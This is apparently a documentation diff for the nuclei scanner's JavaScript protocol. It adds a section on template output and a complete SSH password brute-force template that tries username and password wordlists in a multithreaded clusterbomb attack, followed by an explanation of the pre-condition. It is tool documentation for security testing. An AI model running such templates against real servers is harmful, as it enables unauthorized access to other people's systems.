@@ -70,6 +70,73 @@ Args can be simply understood as variables in javascript that are passed at runt
 
 And that's it this nuclei template can fingerprint any SSH server software previously to support this 
 
+### **Output**
+
+Value of Last expression is returned as output of javascript protocol template and can be used in matchers / extractors. If server returns an error instead then "error" variable is exposed in matcher/extractor with error message
+
+
+### **SSH Password Bruteforce Template**
+
+```yaml
+id: ssh-brute
+
+info:
+  name: SSH Credential Stuffing
+  author: tarunKoyalwar
+  severity: critical
+  
+
+javascript:
+  - pre-condition: |
+      var m = require("nuclei/ssh");
+      var c = m.SSHClient();
+      var response = c.ConnectSSHInfoMode(Host, Port);
+      // only bruteforce if ssh allows password based authentication
+      response["UserAuth"].includes("password")
+
+    code: |
+      var m = require("nuclei/ssh");
+      var c = m.SSHClient();
+      c.Connect(Host,Port,Username,Password);
+
+    args:
+      Host: "{{Host}}"
+      Port: "22"
+      Username: "{{usernames}}"
+      Password: "{{passwords}}"
+    
+    payloads:
+      usernames: helpers/wordlists/wp-users.txt
+      passwords: helpers/wordlists/wp-passwords.txt
+    attack: clusterbomb
+    threads: 10
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "response == true"
+          - "success == true"
+        condition: and
+```
+
+In above nuclei template we are bruteforcing ssh server with list of usernames and passwords. We can tell that this might not have been possible to achieve with network template Let's break down the template
+
+### **Pre-Condition**
+
+Pre-Condition is a optional javascript code that is executed before running "code" and acts as pre-condition to exploit. In above template before attempting to bruteforce we are checking if 
+- address is actually a ssh server
+- ssh server is configured to allow password based authentication
+
+**Furthur explaination** 
+
+- If pre-condition returns `true` only then code is executed otherwise it is skipped
+- In code section we import `nuclei/ssh` module and create a new instance of `SSHClient` object
+- and then we attempt to connect to ssh server with username and password
+- this template uses [payloads](https://docs.nuclei.sh/template-guide/http/http-payloads) to launch a clusterbomb attack with 10 threads and exits on first match
+
+ Looking at this template now we can tell that javascript template is very powerful to write multi step and protocol/vendor specific exploits which is primary goal of javascript protocol.
+
 
 ## Goals of Javascript Protocol
 
